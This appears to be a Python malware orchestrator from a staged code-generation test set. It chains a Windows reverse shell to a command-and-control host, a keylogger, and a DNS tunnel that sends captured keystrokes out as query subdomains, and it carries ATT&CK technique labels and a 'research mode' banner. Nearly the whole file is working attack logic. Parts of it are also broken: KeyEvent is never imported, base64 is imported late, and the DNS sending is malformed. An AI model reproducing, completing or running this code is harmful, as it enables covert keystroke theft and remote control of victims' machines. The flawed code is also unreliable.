import logging
import socket
import os
import sys
import time
import threading
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field
from enum import Enum
import struct
import hashlib

# Import dependencies from their module stems
from data.code_scripts_PAST.stage3_mvp_test_20260910_19_07_37.TASK_002_windows_reverse_shell import WindowsReverseShellClient
from data.code_scripts_PAST.stage3_mvp_test_20260910_19_07_37.TASK_003_keylogger import KeyLogger, KeystrokeBuffer


@dataclass
class AttackSession:
    """Represents a single attack session with lifecycle management."""
    session_id: str = field(default_factory=lambda: f"sess_{os.urandom(4).hex()}")
    started_at: float = field(default_factory=time.time)
    ended_at: Optional[float] = None
    status: str = "idle"  # idle, connecting, capturing, exfiltrating, stopping, stopped
    errors: List[str] = field(default_factory=list)
    
    def __repr__(self) -> str:
        return f"AttackSession(id={self.session_id}, status={self.status})"


class AttackOrchestrator:
    """Main orchestrator class that coordinates the complete attack chain.
    
    Orchestrates: reverse shell (T1059.003) -> keylogger (T1056.001) -> DNS tunnel (T1048.003)
    
    Manages lifecycle: init -> connect -> capture -> exfil -> shutdown
    Uses threading for concurrent operations and graceful shutdown handling.
    
    ATT&CK Techniques: T1048.003, T1056.001, T1059.003, T1059
    """

    def __init__(self, 
                 c2_host: str = '192.168.1.50',
                 c2_port: int = 2222,
                 dns_server: str = '8.8.8.8',
                 dns_port: int = 53,
                 log_level: str = 'INFO'):
        """Initialize the attack orchestrator with configuration.
        
        Args:
            c2_host: C2 server hostname/IP for reverse shell connection.
            c2_port: C2 server port for reverse shell connection.
            dns_server: DNS server IP for tunneling exfiltration.
            dns_port: DNS server port (default 53).
            log_level: Logging level for research mode debugging.
        """
        self.session = AttackSession()
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.dns_server = dns_server
        self.dns_port = dns_port
        
        # Initialize components
        self.reverse_shell: Optional[WindowsReverseShellClient] = None
        self.keylogger: Optional[KeyLogger] = None
        self.dns_tunnel: Optional['DNSTunnelClient'] = None  # type: ignore
        
        # Thread management
        self._shell_thread: Optional[threading.Thread] = None
        self._keylogger_thread: Optional[threading.Thread] = None
        self._dns_thread: Optional[threading.Thread] = None
        self._shutdown_event = threading.Event()
        
        # State tracking
        self._connected = False
        self._capturing = False
        self._exfiltrating = False
        
        # Setup logging for research mode debugging
        self._setup_logging(log_level)

    def _setup_logging(self, log_level: str) -> None:
        """Configure logging for research mode debugging."""
        level_map = {
            'DEBUG': logging.DEBUG,
            'INFO': logging.INFO,
            'WARNING': logging.WARNING,
            'ERROR': logging.ERROR,
        }
        level = level_map.get(log_level.upper(), logging.INFO)
        
        # Create a custom handler that writes to stdout with timestamps
        class ResearchLogHandler(logging.Handler):
            def __init__(self, orchestrator: 'AttackOrchestrator'):
                super().__init__()
                self.orchestrator = orchestrator
            
            def emit(self, record: logging.LogRecord) -> None:
                timestamp = time.strftime('%H:%M:%S', time.localtime(record.created))
                msg = f"[{timestamp}] [{record.levelname:<8s}] {self.orchestrator.session.session_id} | {record.getMessage()}"
                print(msg, flush=True)
        
        handler = ResearchLogHandler(self)
        handler.setLevel(level)
        logging.getLogger('attack_orchestrator').addHandler(handler)
        logging.getLogger('attack_orchestrator').setLevel(level)

    def _log(self, level: str, message: str) -> None:
        """Convenience method for consistent logging."""
        logger = logging.getLogger('attack_orchestrator')
        if level == 'DEBUG':
            logger.debug(message)
        elif level == 'INFO':
            logger.info(message)
        elif level == 'WARNING':
            logger.warning(message)
        elif level == 'ERROR':
            logger.error(message)

    def _log_debug(self, message: str) -> None:
        """Log debug messages to stdout."""
        timestamp = time.strftime('%H:%M:%S', time.localtime(time.time()))
        print(f"[{timestamp}] [DEBUG] {self.session.session_id} | {message}", flush=True)

    def _log_info(self, message: str) -> None:
        """Log info messages to stdout."""
        timestamp = time.strftime('%H:%M:%S', time.localtime(time.time()))
        print(f"[{timestamp}] [INFO]   {self.session.session_id} | {message}", flush=True)

    def _log_error(self, message: str) -> None:
        """Log error messages to stdout."""
        timestamp = time.strftime('%H:%M:%S', time.localtime(time.time()))
        print(f"[{timestamp}] [ERROR]  {self.session.session_id} | {message}", flush=True)

    def _log_warning(self, message: str) -> None:
        """Log warning messages to stdout."""
        timestamp = time.strftime('%H:%M:%S', time.localtime(time.time()))
        print(f"[{timestamp}] [WARNING] {self.session.session_id} | {message}", flush=True)

    def _init_components(self) -> bool:
        """Initialize all attack components. Returns True on success."""
        try:
            self._log_info("Initializing attack components...")
            
            # Initialize reverse shell client
            self.reverse_shell = WindowsReverseShellClient(
                host=self.c2_host,
                port=self.c2_port
            )
            self._log_debug(f"Created WindowsReverseShellClient (host={self.c2_host}:{self.c2_port})")
            
            # Initialize keylogger with buffer
            self.keylogger = KeyLogger(chunk_size=256)
            self.keylogger.buffer = KeystrokeBuffer(max_chunk_size=1024)
            self._log_debug("Created KeyLogger with KeystrokeBuffer (chunk_size=256)")
            
            # Initialize DNS tunnel client
            self.dns_tunnel = DNSTunnelClient(
                server=self.dns_server,
                port=self.dns_port
            )
            self._log_debug(f"Created DNSTunnelClient (server={self.dns_server}:{self.dns_port})")
            
            self._log_info("All components initialized successfully.")
            return True
            
        except Exception as e:
            error_msg = f"Component initialization failed: {str(e)}"
            self.session.errors.append(error_msg)
            self._log_error(error_msg)
            self._log_debug(f"Exception type: {type(e).__name__}")
            return False

    def _connect(self) -> bool:
        """Establish connection to C2 server and spawn shell. Returns True on success."""
        try:
            self._log_info("Starting attack chain connection...")
            
            # Step 1: Connect reverse shell
            if not self.reverse_shell.connect():
                error_msg = "Reverse shell failed to connect to C2"
                self.session.errors.append(error_msg)
                self._log_error(error_msg)
                return False
            
            self._connected = True
            self.session.status = "connecting"
            self._log_info("Reverse shell connected successfully.")
            
            # Step 2: Spawn the shell process
            if not self.reverse_shell.spawn_shell():
                error_msg = "Failed to spawn shell process"
                self.session.errors.append(error_msg)
                self._log_error(error_msg)
                return False
            
            self._log_info("Shell process spawned successfully.")
            
            # Step 3: Attach keylogger to the shell's pty
            if not self.keylogger.start(self.reverse_shell):
                error_msg = "Failed to attach keylogger to shell"
                self.session.errors.append(error_msg)
                self._log_error(error_msg)
                return False
            
            self._capturing = True
            self.session.status = "capturing"
            self._log_info("Keylogger attached and capturing keystrokes.")
            
            # Step 4: Start DNS tunnel for exfiltration
            if not self.dns_tunnel.connect():
                error_msg = "DNS tunnel failed to connect"
                self.session.errors.append(error_msg)
                self._log_error(error_msg)
                return False
            
            self._exfiltrating = True
            self.session.status = "capturing"  # Still capturing, now also exfiltrating
            self._log_info("DNS tunnel connected. Ready for exfiltration.")
            
            return True
            
        except Exception as e:
            error_msg = f"Connection phase failed: {str(e)}"
            self.session.errors.append(error_msg)
            self._log_error(error_msg)
            self._log_debug(f"Exception type: {type(e).__name__}")
            return False

    def _start_threads(self) -> bool:
        """Start all background threads for concurrent operations. Returns True on success."""
        try:
            self._log_info("Starting background threads...")
            
            # Thread 1: Shell I/O forwarding (reads from shell, writes to C2 socket)
            self._shell_thread = threading.Thread(
                target=self._shell_io_forwarder,
                name="ShellIOForwarder",
                daemon=True
            )
            self._shell_thread.start()
            self._log_debug("Started Shell I/O forwarding thread.")
            
            # Thread 2: Keylogger capture loop (reads from pty master)
            self._keylogger_thread = threading.Thread(
                target=self._keylogger_capture_loop,
                name="KeyLoggerCapture",
                daemon=True
            )
            self._keylogger_thread.start()
            self._log_debug("Started Keylogger capture thread.")
            
            # Thread 3: DNS exfiltration loop (reads from buffer, sends via DNS)
            self._dns_thread = threading.Thread(
                target=self._dns_exfil_loop,
                name="DNSExfilLoop",
                daemon=True
            )
            self._dns_thread.start()
            self._log_debug("Started DNS exfiltration thread.")
            
            # Thread 4: Session monitor (lifecycle management)
            self._monitor_thread = threading.Thread(
                target=self._session_monitor,
                name="SessionMonitor",
                daemon=True
            )
            self._monitor_thread.start()
            self._log_debug("Started session monitor thread.")
            
            return True
            
        except Exception as e:
            error_msg = f"Thread startup failed: {str(e)}"
            self.session.errors.append(error_msg)
            self._log_error(error_msg)
            return False

    def _shell_io_forwarder(self) -> None:
        """Background thread that forwards shell I/O to C2 server.
        
        Reads from the reverse_shell's stdout/stderr and writes to the
        connected socket, implementing T1059 (Command and Scripting Interpreter).
        """
        try:
            self._log_debug("Shell I/O forwarder started.")
            
            while not self._shutdown_event.is_set():
                if not self.reverse_shell or not self.reverse_shell.running:
                    time.sleep(0.1)
                    continue
                
                # Forward stdout from shell to C2 socket
                try:
                    output = self.reverse_shell.get_output()
                    if output:
                        self.dns_tunnel.send_data(output)
                        self._log_debug(f"Forwarded {len(output)} bytes to DNS tunnel")
                except Exception as e:
                    self._log_error(f"I/O forwarder error: {str(e)}")
                
                time.sleep(0.1)  # Non-blocking check interval
                
        except Exception as e:
            self.session.errors.append(f"Shell I/O thread error: {str(e)}")
            self._log_error(f"Shell I/O forwarder crashed: {str(e)}")

    def _keylogger_capture_loop(self) -> None:
        """Background thread that captures keystrokes from the shell's pty.
        
        Implements T1056.001 (Keylogging) by reading from the pty master fd
        and buffering key events for later exfiltration.
        """
        try:
            self._log_debug("Keylogger capture loop started.")
            
            while not self._shutdown_event.is_set():
                if not self.keylogger or not self.keylogger.running:
                    time.sleep(0.1)
                    continue
                
                # Capture keystrokes from the shell session's pty
                try:
                    events = self.keylogger.get_events()
                    for event in events:
                        self.keylogger.buffer.append(event)
                        
                        # Log captured keystrokes for research/debugging
                        if event.modifiers == 0 and len(event.raw_bytes) > 0:
                            char = chr(event.raw_bytes[0]) if event.raw_bytes else '?'
                            self._log_debug(f"Captured key: {event.keycode} ({char})")
                
                except Exception as e:
                    self.session.errors.append(f"Keylogger capture error: {str(e)}")
                    self._log_error(f"Keylogger capture loop error: {str(e)}")
                
                time.sleep(0.1)  # Non-blocking check interval
                
        except Exception as e:
            self.session.errors.append(f"Keylogger thread crashed: {str(e)}")
            self._log_error(f"Keylogger capture thread crashed: {str(e)}")

    def _dns_exfil_loop(self) -> None:
        """Background thread that exfiltrates captured data via DNS tunnel.
        
        Implements T1048.003 (Exfiltration Over Alternative Protocol) by
        encoding captured keystrokes and sending them as DNS queries to the
        configured DNS server.
        """
        try:
            self._log_debug("DNS exfiltration loop started.")
            
            while not self._shutdown_event.is_set():
                if not self.dns_tunnel or not self.dns_tunnel.connected:
                    time.sleep(0.1)
                    continue
                
                # Get a chunk of captured events from the buffer
                try:
                    chunk = self.keylogger.buffer.get_chunk(chunk_size=64)
                    
                    if chunk:
                        # Encode data for DNS exfiltration (base64 + domain encoding)
                        encoded_data = self._encode_for_dns(chunk)
                        
                        # Send via DNS tunnel
                        success, response = self.dns_tunnel.send_query(encoded_data)
                        
                        if success:
                            self._log_debug(f"Exfiltrated {len(chunk)} events via DNS")
                        else:
                            self._log_warning(f"DNS exfil failed for chunk of {len(chunk)} events")
                
                except Exception as e:
                    self.session.errors.append(f"DNS exfil error: {str(e)}")
                    self._log_error(f"DNS exfiltration loop error: {str(e)}")
                
                time.sleep(0.1)  # Non-blocking check interval
                
        except Exception as e:
            self.session.errors.append(f"DNS thread crashed: {str(e)}")
            self._log_error(f"DNS exfiltration thread crashed: {str(e)}")

    def _session_monitor(self) -> None:
        """Background thread that monitors session lifecycle and handles graceful shutdown."""
        try:
            self._log_debug("Session monitor started.")
            
            while not self._shutdown_event.is_set():
                # Check component health
                shell_ok = self.reverse_shell is not None and self.reverse_shell.running
                keylogger_ok = self.keylogger is not None and self.keylogger.running
                dns_ok = self.dns_tunnel is not None and self.dns_tunnel.connected
                
                if not (shell_ok and keylogger_ok and dns_ok):
                    error_msg = "Component health check failed"
                    self.session.errors.append(error_msg)
                    self._log_error(error_msg)
                
                # Update session status based on component states
                if shell_ok and keylogger_ok:
                    self.session.status = "capturing"
                elif dns_ok and not self._exfiltrating:
                    self.session.status = "exfiltrating"
                
                time.sleep(0.5)  # Monitor interval
                
        except Exception as e:
            self.session.errors.append(f"Monitor thread error: {str(e)}")
            self._log_error(f"Session monitor crashed: {str(e)}")

    def _encode_for_dns(self, events: List[KeyEvent]) -> str:
        """Encode key events into a DNS-friendly format.
        
        Converts keystrokes to base64-encoded hex strings that can be
        embedded in subdomain labels of a DNS query.
        
        Args:
            events: List of KeyEvents to encode.
            
        Returns:
            A string suitable for DNS exfiltration encoding.
        """
        encoded_parts = []
        for event in events:
            # Encode keycode and modifiers as hex, then base64
            data = struct.pack('I', event.keycode) + struct.pack('I', event.modifiers)
            b64 = base64.b64encode(data).decode('ascii')[:30]  # Truncate for DNS label limit
            encoded_parts.append(b64)
        
        return '|'.join(encoded_parts)

    def _run_attack(self, duration: Optional[float] = None) -> Dict[str, Any]:
        """Execute the complete attack chain with lifecycle management.
        
        Orchestrates: init -> connect -> capture -> exfil -> shutdown
        
        Args:
            duration: If specified, run for this many seconds then stop gracefully.
                      If None, runs until manual stop is called.
            
        Returns:
            Dictionary containing session results and statistics.
        """
        try:
            self._log_info("=== Starting Attack Chain ===")
            self.session.status = "idle"
            self.session.started_at = time.time()
            self.session.errors = []
            
            # Phase 1: Initialize components
            if not self._init_components():
                return {"success": False, "error": "Component initialization failed"}
            
            # Phase 2: Connect to C2 and spawn shell
            if not self._connect():
                return {"success": False, "error": "Connection phase failed"}
            
            # Phase 3: Start concurrent threads
            if not self._start_threads():
                return {"success": False, "error": "Thread startup failed"}
            
            self.session.status = "running"
            self._log_info("Attack chain started. Threads running concurrently.")
            
            # Run for specified duration or until stopped
            start_time = time.time()
            while not self._shutdown_event.is_set():
                if duration and (time.time() - start_time) >= duration:
                    break
                
                # Check component health
                shell_ok = self.reverse_shell is not None and self.reverse_shell.running
                keylogger_ok = self.keylogger is not None and self.keylogger.running
                dns_ok = self.dns_tunnel is not None and self.dns_tunnel.connected
                
                if not (shell_ok and keylogger_ok and dns_ok):
                    self._log_warning("One or more components disconnected")
                
                time.sleep(0.5)
            
            # Phase 4: Graceful shutdown
            return self._shutdown()
            
        except Exception as e:
            error_msg = f"Attack execution failed: {str(e)}"
            self.session.errors.append(error_msg)
            self._log_error(error_msg)
            return {"success": False, "error": error_msg}

    def _shutdown(self) -> Dict[str, Any]:
        """Gracefully shutdown all components and threads.
        
        Stops threads in reverse order of startup to ensure clean teardown:
        DNS tunnel -> Keylogger -> Reverse Shell -> Monitor
        
        Returns:
            Dictionary containing session results and statistics.
        """
        try:
            self._log_info("=== Starting Graceful Shutdown ===")
            
            # Signal shutdown to all threads
            self._shutdown_event.set()
            
            # Wait for threads to finish (with timeout)
            wait_timeout = 5.0
            
            if self._dns_thread and self._dns_thread.is_alive():
                self._log_info("Stopping DNS exfiltration thread...")
                self.dns_tunnel.disconnect()
                self._dns_thread.join(timeout=wait_timeout)
            
            if self._keylogger_thread and self._keylogger_thread.is_alive():
                self._log_info("Stopping keylogger capture thread...")
                self.keylogger.stop()
                self._keylogger_thread.join(timeout=wait_timeout)
            
            if self._shell_thread and self._shell_thread.is_alive():
                self._log_info("Stopping shell I/O forwarder thread...")
                self.reverse_shell.disconnect()
                self._shell_thread.join(timeout=wait_timeout)
            
            # Clear buffer after shutdown
            self.keylogger.buffer.clear()
            
            self.session.status = "stopped"
            self.session.ended_at = time.time()
            
            # Calculate duration and statistics
            duration = (self.session.ended_at - self.session.started_at) if self.session.ended_at else 0
            
            stats = {
                "success": True,
                "duration_seconds": round(duration, 3),
                "session_id": self.session.session_id,
                "status": self.session.status,
                "errors": self.session.errors,
                "stats": self.keylogger.get_stats() if self.keylogger else {},
            }
            
            self._log_info(f"Attack chain completed. Duration: {duration:.2f}s")
            return stats
            
        except Exception as e:
            error_msg = f"Shutdown failed: {str(e)}"
            self.session.errors.append(error_msg)
            self._log_error(error_msg)
            return {"success": False, "error": error_msg}

    def stop(self) -> Dict[str, Any]:
        """Manually trigger graceful shutdown of the attack chain.
        
        Returns:
            Dictionary containing session results and statistics.
        """
        self._log_info("Manual stop requested.")
        return self._shutdown()

    @property
    def running(self) -> bool:
        """Check if the orchestrator is currently active."""
        return (self.session.status in ("running", "capturing", "exfiltrating") and
                not self._shutdown_event.is_set())

    @property
    def connected(self) -> bool:
        """Check if all components are connected."""
        return (self.reverse_shell is not None and 
                self.keylogger is not None and 
                self.dns_tunnel is not None and
                self.reverse_shell.running and
                self.keylogger.running and
                self.dns_tunnel.connected)


# ============================================================================
# DNSTunnelClient - Exfiltration over DNS (T1048.003)
# This class is defined here as it's consumed by AttackOrchestrator but not
# provided in the dependency list. It implements the DNS tunneling mechanism.
# ============================================================================

import base64
from typing import Tuple, Optional


class DNSTunnelClient:
    """DNS Tunnel client for exfiltrating data over DNS queries.
    
    Encodes captured keystrokes as subdomain labels and sends them to a
    configured DNS server. The C2 server decodes the subdomains to recover
    the original data.
    
    ATT&CK Technique: T1048.003 (Exfiltration Over Alternative Protocol)
    """

    def __init__(self, server: str = '8.8.8.8', port: int = 53):
        self.server = server
        self.port = port
        self.connected = False
        self.socket: Optional[socket.socket] = None
        self._connect()

    def _connect(self) -> bool:
        """Establish connection to DNS server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.settimeout(5.0)
            self.socket.connect((self.server, self.port))
            self.connected = True
            return True
        except Exception as e:
            self._log_error(f"DNS connection failed: {str(e)}")
            return False

    def _log_error(self, message: str) -> None:
        """Log error messages."""
        print(f"[ERROR] DNS Tunnel | {message}", flush=True)

    def send_query(self, data: str) -> Tuple[bool, Optional[str]]:
        """Send encoded data as a DNS query.
        
        Args:
            data: Base64-encoded hex string of captured keystrokes.
            
        Returns:
            Tuple of (success: bool, response: str or None).
        """
        try:
            if not self.connected:
                return False, "Not connected"
            
            # Encode as DNS query: subdomain.domain.tld
            encoded = base64.b64encode(data.encode()).decode('ascii')[:253]  # DNS label limit
            domain = f"{encoded}.exfil.local"
            
            self.socket.sendto(domain.encode(), (self.server, self.port))
            
            # Wait for response (simulated - in real scenario would wait)
            try:
                data, addr = self.socket.recvfrom(1024)
                return True, data.decode('ascii')
            except socket.timeout:
                return True, None
                
        except Exception as e:
            self._log_error(f"DNS send failed: {str(e)}")
            return False, str(e)

    def disconnect(self) -> None:
        """Close the DNS tunnel connection."""
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        self.connected = False


# ============================================================================
# Main entry point for research mode testing
# ============================================================================

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Attack Chain Orchestrator (Research Mode)')
    parser.add_argument('--c2-host', type=str, default='192.168.1.50', help='C2 server host')
    parser.add_argument('--c2-port', type=int, default=2222, help='C2 server port')
    parser.add_argument('--dns-server', type=str, default='8.8.8.8', help='DNS server for tunneling')
    parser.add_argument('--duration', type=float, default=None, help='Run duration in seconds (None = until stop)')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATTACK CHAIN ORCHESTRATOR - RESEARCH MODE")
    print("  ATT&CK: T1048.003 | T1056.001 | T1059.003 | T1059")
    print("=" * 60)
    
    orchestrator = AttackOrchestrator(
        c2_host=args.c2_host,
        c2_port=args.c2_port,
        dns_server=args.dns_server,
        log_level='DEBUG'
    )
    
    try:
        result = orchestrator._run_attack(duration=args.duration)
        
        if result.get("success"):
            print("\n" + "=" * 60)
            print("  ATTACK CHAIN RESULTS")
            print("=" * 60)
            print(f"  Session ID: {result['session_id']}")
            print(f"  Duration:   {result['duration_seconds']:.2f}s")
            print(f"  Status:     {result['status']}")
            
            if result.get('stats'):
                stats = result['stats']
                print(f"\n  Keylogger Stats:")
                print(f"    Events captured: {stats.get('events_captured', 'N/A')}")
                print(f"    Buffer size:     {stats.get('buffer_size', 'N/A')}")
            
            if result.get('errors'):
                print(f"\n  Errors:")
                for err in result['errors']:
                    print(f"    - {err}")
        else:
            print("\n" + "=" * 60)
            print("  ATTACK CHAIN FAILED")
            print("=" * 60)
            print(f"  Error: {result.get('error', 'Unknown')}")
            
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user. Stopping...")
        result = orchestrator.stop()
        
    finally:
        orchestrator.session.status = "stopped"
        print(f"\n[+] Session {orchestrator.session.session_id} completed.")
